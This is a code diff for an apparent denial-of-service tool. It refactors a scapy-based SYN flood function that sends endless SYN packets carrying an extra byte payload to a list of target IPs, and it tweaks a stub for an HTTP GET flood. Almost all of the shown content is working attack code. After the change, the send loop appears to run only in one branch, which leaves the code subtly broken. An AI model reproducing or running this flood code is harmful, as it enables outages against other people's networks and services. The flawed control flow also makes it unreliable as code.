@@ -137,44 +137,35 @@ class ProtocolAttack:
 
 
     @staticmethod
-    def syn_flood(vector: list, port: int):
-        portt = input("If you want to change the verbose mode or the starting port, type y... if you do not press (n) or other \n")
-        if portt == 'y':
+    def syn_flood(vector: list, port: int, bye: bytes):
+        portt = input("If you want to change the verbose mode or the starting port, type y... if not, press (n) or other \n")
+        if portt.lower() == 'y':
             sport = input("You can choose a different port where your TCP signal will start, do you want? (y/n) \n")
             verbose = input("You can also choose if you want to make some noise while doing the attack, not advised, do you want? (y/n) \n")
-            
-            if sport.lower() == 'y' and verbose.lower() == 'y':
-                ssport = int(input("Choose the port: \n"))
-                for i in vector:
-                    ip = IP(dst=i)
-                    tcp = TCP(sport=ssport, dport=port, flags="S")
-                    pkt = ip/tcp
-                    send(pkt, loop=1, verbose=1)
 
-            elif sport.lower() != 'y' and verbose.lower() == 'y':
-                for i in vector:
-                    ip = IP(dst=i)
-                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
-                    pkt = ip/tcp
-                    send(pkt, loop=1, verbose=1)
-
-            elif sport.lower() == 'y' and verbose.lower() != 'n':
-                ssport = int(input("Choose the port: \n"))
-                for i in vector:
-                    ip = IP(dst=i)
-                    tcp = TCP(sport=ssport, dport=port, flags="S")
-                    pkt = ip/tcp
-                    send(pkt, loop=1, verbose=1)
-
+            if sport.lower() == 'y':
+                try:
+                    ssport = int(input("Choose the port: \n"))
+                    if not (0 <= ssport <= 65535):
+                        raise ValueError("Port out of range")
+                except ValueError as e:
+                    print(f"Invalid port: {e}")
+                    return
             else:
-                pass
+                ssport = RandShort()
+            
+            verbose_mode = 1 if verbose.lower() == 'y' else 0
+            
         else:
+            ssport = RandShort()
+            verbose_mode = 0
+
             for i in vector:
                 ip = IP(dst=i)
-                tcp = TCP(sport=RandShort(), dport=port, flags="S")
-                pkt = ip/tcp
-                send(pkt, loop=1, verbose=0)
-
+                raw = bye
+                tcp = TCP(sport=ssport, dport=port, flags="S")
+                pkt = ip/tcp/raw
+                send(pkt, loop=1, verbose=verbose_mode)
 
 class ApplicationLayerAttack:
     @staticmethod
@@ -190,5 +181,4 @@ class ApplicationLayerAttack:
 
     @staticmethod
     def get(vector: list, bye: bytes):
-        print("get method")
-        
+        print(f"GET attack on {vector} with {len(bye)} bytes")
